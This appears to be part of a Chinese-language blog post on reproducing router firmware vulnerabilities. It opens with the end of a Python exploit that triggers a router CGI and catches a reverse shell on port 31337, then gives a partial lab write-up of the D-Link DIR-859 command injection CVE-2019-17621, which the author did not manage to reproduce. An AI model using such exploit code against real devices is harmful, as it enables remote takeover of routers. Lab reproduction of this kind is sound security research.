    <span class="keyword">try</span>:
        requests.post(<span class="string">&quot;http://192.168.2.2/guest_logout.cgi&quot;</span>, data=data, timeout=<span class="number">1</span>)
    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
        <span class="built_in">print</span>(e)

thread = Thread(target=attack)
thread.start()

io = listen(<span class="number">31337</span>)
io.wait_for_connection()
log.success(<span class="string">&quot;getshell&quot;</span>)
io.interactive()

thread.join()</code></pre>



<h1 id="D-Link-DIR-859-命令注入漏洞（CVE-2019-17621）"><a href="#D-Link-DIR-859-命令注入漏洞（CVE-2019-17621）" class="headerlink" title="D-Link DIR-859 命令注入漏洞（CVE-2019-17621）"></a>D-Link DIR-859 命令注入漏洞（CVE-2019-17621）<a id="DLINK"></a></h1><h2 id="漏洞环境-4"><a href="#漏洞环境-4" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><ul>
<li>docker：攻击、调试主机：192.168.2.1</li>
<li>firmadyne：固件主机：192.168.0.1</li>
<li>htdocs&#x2F;cgibin（有漏洞的服务程序）：192.168.0.1:49152</li>
<li>镜像依赖：<code>firmianay/ubuntu1604 -&gt; firmianay/binwalk:noentry -&gt; firmianay/firmadyne（或者 firmianay/firmae）</code></li>
</ul>
<h2 id="环境搭建-4"><a href="#环境搭建-4" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>缺少的镜像需要到对应baseimage目录下面构建</p>
<blockquote>
<p>docker run –rm -v $PWD&#x2F;firmware&#x2F;:&#x2F;root&#x2F;firmware firmianay&#x2F;binwalk -Mer “&#x2F;root&#x2F;firmware&#x2F;DIR822A1_FW103WWb03.bin”</p>
<p>docker-compose -f docker-compose-firmadyne.yml build   #docker-compose -f docker-compose-firmae.yml build</p>
<p>docker-compose -f docker-compose-firmadyne.yml up       #docker-compose -f docker-compose-firmae.yml up</p>
</blockquote>
<p>两种方法都尝试了，docker都没起来</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406271926418.png" alt="image-20240627192536273"></p>
<h3 id="本地环境搭建"><a href="#本地环境搭建" class="headerlink" title="本地环境搭建"></a>本地环境搭建</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/TzFepaBpYnMbZ8Mep4IXwA">D-Link DIR-859 RCE漏洞（CVE-2019-17621）分析复现 (qq.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/liyansong2018/firmware-analysis-plus">liyansong2018&#x2F;firmware-analysis-plus: Simulate firmware with one click of firmadyne (使用 firmadyne 一键模拟固件) (github.com)</a></p>
<p>由于服务器为centos7，不支持firmadyne工具使用，本地vmware-ubuntu16.04虚拟机环境搭建</p>
<p>项目构建好后先使用binwalk提取固件</p>
<blockquote>
<p>sudo binwalk -e –run-as&#x3D;root DIR822A1_FW103WWb03.bin</p>
</blockquote>
<p>然后使用extractor.py脚本分析处理信息</p>
<blockquote>
<p>sudo .&#x2F;sources&#x2F;extractor&#x2F;extractor.py -b Dlink -sql 127.0.0.1 -np -nk “DIR822A1_FW103WWb03.bin” images</p>
</blockquote>
<p>但是不知道为什么会在分析过程中卡死……</p>
<p>卡死。。。</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406272228828.png" alt="image-20240627222438432"></p>
<p>暂不在这上面花太多精力了。直接通过分离出的cgibin进行简单分析漏洞成因。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/TzFepaBpYnMbZ8Mep4IXwA">D-Link DIR-859 RCE漏洞（CVE-2019-17621）分析复现 (qq.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/m00nflower/p/15933470.html">CVE-2019-17621 Dlink-859 RCE 复现 - moon_flower - 博客园 (cnblogs.com)</a></p>
<p>第二位师傅已经将流程详细的讲解了一遍，这里就不多赘述了。</p>
<p>主要漏洞利用在：利用fwrite函数控制$shell_file的值，如果向$shell_file中写入了由反引号包裹的命令，就能RCE绕过。</p>
<p>cigbin程序中的调用流程：buf_8 -&gt;xmldbc_ephp-&gt;FUN_0041420c -&gt;FUN_0041372c -&gt; socket</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406272301792.png" alt="image-20240627230116665"></p>
<p>调用了GENA_subscribe_new()，定义在gena.php文件中  htdocs&#x2F;upnpinc下</p>
<p>这里也就是漏洞所在。。</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406272304282.png" alt="image-20240627230435176"></p>
<p>这个cve的复现实在是超出力所能及的范围了，不仅仅是docker环境g了，还有本地分析工具的构建，以及漏洞的分析挖掘，让人有些郁闷了。。</p>
<p>ing。。。</p>
</main>

</article>


<script src="/js/highlight.js"></script>

  </main>
  <footer class="footer">
  
  <span>Copyright © 2024 typo</span>
  
</footer>
  
<script src="/js/theme.js"></script>

</body>

</html>